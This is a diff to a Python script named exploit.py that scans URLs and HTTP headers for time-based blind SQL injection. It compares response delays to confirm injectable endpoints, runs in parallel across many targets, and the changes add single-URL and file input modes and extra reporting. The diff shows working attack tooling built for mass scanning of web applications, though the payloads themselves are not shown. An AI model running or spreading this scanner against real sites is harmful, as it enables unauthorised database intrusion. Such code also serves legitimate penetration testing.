@@ -25,17 +25,16 @@ def menu():
     options, args = parser.parse_args()
 
     if not options.url and not options.file:
-        print('[+] Specify an url')
+        print('[+] Specify an url or file')
         print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
+        print('[+] Example usage: exploit.py -f urls -t 10')
+
         exit()
     if not options.time_to_sleep:
         print('[+] Specify a blind time based payload')
         print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
         exit()
-    if not options.file:
-        print('[+] Specify a file')
-        print('[+] Example usage: exploit.py -f urls -u http://target-uri/ -t 10')
-        exit()
+
     globals().update(locals())
 
 def mesure_time_loading(url,url_replaced=False,header_word=False,value_word=False):
@@ -68,15 +67,21 @@ def check_sqli_time_based(url,url_replaced=False,header_word=False,value_word=Fa
     blind_elapsed_time = mesure_time_loading(url,url_replaced,header_word,value_word)
     second_elapsed_time = mesure_time_loading(url)
     average_common_elapsed_time = round((sum([first_elapsed_time+second_elapsed_time])/2),2)
-    rules_to_confirme_blind_sqli = average_common_elapsed_time < blind_elapsed_time and blind_elapsed_time > options.time_to_sleep
+    rules_to_confirme_blind_sqli = average_common_elapsed_time < blind_elapsed_time and blind_elapsed_time > options.time_to_sleep and blind_elapsed_time > 10
 
     if url_replaced:
         url=url_replaced # just to log the sqli url
     if rules_to_confirme_blind_sqli:
-        print('{}[Blind Confirmed]{} {} / [Reqs] Average:{} Blinded:{}'.format(Fore.RED,Fore.RESET,url,average_common_elapsed_time,blind_elapsed_time))
+        if header_word and value_word:
+            print('{}[Blind Confirmed]{} {} /[Header] Name:{} Value:{} /[Reqs] Average:{} Blinded:{}'.format(Fore.RED,Fore.RESET,url,header_word,value_word,average_common_elapsed_time,blind_elapsed_time))
+        else:
+            print('{}[Blind Confirmed]{} {} / [Reqs] Average:{} Blinded:{}'.format(Fore.RED,Fore.RESET,url,average_common_elapsed_time,blind_elapsed_time))
     else:
         if options.verbose_errors:
-            print('{}[There isnt blind SQLI]{}{}'.format(Fore.BLACK,Fore.LIGHTBLACK_EX,url,Style.RESET_ALL))
+            if header_word and value_word:
+                print('{}[There isnt blind SQLI]{}{} | Header {}={}'.format(Fore.BLACK,Fore.LIGHTBLACK_EX,url,header_word,value_word,Style.RESET_ALL))
+            else:
+                print('{}[There isnt blind SQLI]{}{}'.format(Fore.BLACK,Fore.LIGHTBLACK_EX,url,Style.RESET_ALL))
 
 def url_mutation_querie_fuzz(url):
     if not url.startswith('http'):
@@ -129,12 +134,15 @@ def brute_blind_header(url):
 
 def main():
     menu()
+    fire = multiprocessing.Pool(options.threads)
     if not sys.stdin.isatty():
         urls = sys.stdin.read()
-    else:
+    elif options.url:
+        urls = options.url
+        url_mutation_querie_fuzz(urls)
+    elif options.file:
         f = open(options.file)
         urls = map(str.strip, f.readlines())
-        fire = multiprocessing.Pool(options.threads)
     if options.brute_file_to_fuzz_header:
         try:
             fire.map(brute_blind_header, urls)
